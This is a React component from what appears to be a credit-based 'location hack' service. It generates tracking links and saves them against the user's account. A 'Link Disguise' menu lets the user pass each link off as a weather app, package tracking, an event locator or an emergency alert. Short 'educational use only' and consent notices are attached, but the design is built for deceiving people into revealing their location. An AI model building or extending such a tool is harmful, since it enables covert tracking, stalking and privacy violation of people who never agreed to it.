
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { UserSession, UserDataManager, LocationHackLink } from "@/utils/userData";
import { useToast } from "@/hooks/use-toast";
import { Copy, MapPin } from "lucide-react";

interface LocationHackToolProps {
  user: UserSession;
  onUseCredit: () => boolean;
}

export const LocationHackTool = ({ user, onUseCredit }: LocationHackToolProps) => {
  const [linkType, setLinkType] = useState<string>('weather');
  const [generatedLink, setGeneratedLink] = useState<string>('');
  const { toast } = useToast();

  const generateLocationLink = () => {
    if (!onUseCredit()) return;

    const linkId = Date.now().toString();
    const baseUrl = window.location.origin;
    const locationUrl = `${baseUrl}/loc/${linkType}/${linkId}#${user.id}`;

    const locationLink: LocationHackLink = {
      id: linkId,
      userId: user.id,
      url: locationUrl,
      locations: [],
      createdAt: new Date().toISOString()
    };

    UserDataManager.saveLocationLink(locationLink);
    setGeneratedLink(locationUrl);

    toast({
      title: "Location Link Generated",
      description: "Your educational location tracking link has been created!",
    });
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedLink);
    toast({
      title: "Copied!",
      description: "Link copied to clipboard",
    });
  };

  return (
    <div className="space-y-6">
      <Card className="bg-gray-800/50 border-green-500/20 backdrop-blur-sm">
        <CardHeader>
          <CardTitle className="text-green-400 flex items-center">
            <MapPin className="h-5 w-5 mr-2" />
            Location Tracker Tool
          </CardTitle>
          <p className="text-gray-400">Generate educational location tracking links for awareness testing</p>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <Label className="text-gray-300">Link Disguise</Label>
            <select 
              value={linkType} 
              onChange={(e) => setLinkType(e.target.value)}
              className="w-full bg-gray-700/50 border border-gray-600 text-white rounded-md px-3 py-2"
            >
              <option value="weather">Weather App</option>
              <option value="map">Interactive Map</option>
              <option value="delivery">Package Tracking</option>
              <option value="event">Event Locator</option>
              <option value="emergency">Emergency Alert</option>
            </select>
          </div>

          <Button 
            onClick={generateLocationLink}
            className="w-full bg-gradient-to-r from-green-600 to-teal-600 hover:from-green-700 hover:to-teal-700"
            disabled={user.credits <= 0}
          >
            Generate Location Link (1 Credit)
          </Button>

          {generatedLink && (
            <div className="space-y-2">
              <Label className="text-gray-300">Generated Link</Label>
              <div className="flex space-x-2">
                <Input
                  value={generatedLink}
                  readOnly
                  className="bg-gray-700/50 border-gray-600 text-white"
                />
                <Button onClick={copyToClipboard} size="sm">
                  <Copy className="h-4 w-4" />
                </Button>
              </div>
              <p className="text-xs text-yellow-400">
                ⚠️ Educational Use Only: Use responsibly for authorized security testing
              </p>
            </div>
          )}
        </CardContent>
      </Card>

      <Card className="bg-red-900/20 border-red-500/30">
        <CardContent className="pt-6">
          <h4 className="text-red-400 font-bold mb-2">Privacy Warning</h4>
          <p className="text-red-300 text-sm">
            This tool demonstrates location tracking vulnerabilities. Use only with explicit consent 
            and in accordance with applicable privacy laws and regulations.
          </p>
        </CardContent>
      </Card>
    </div>
  );
};
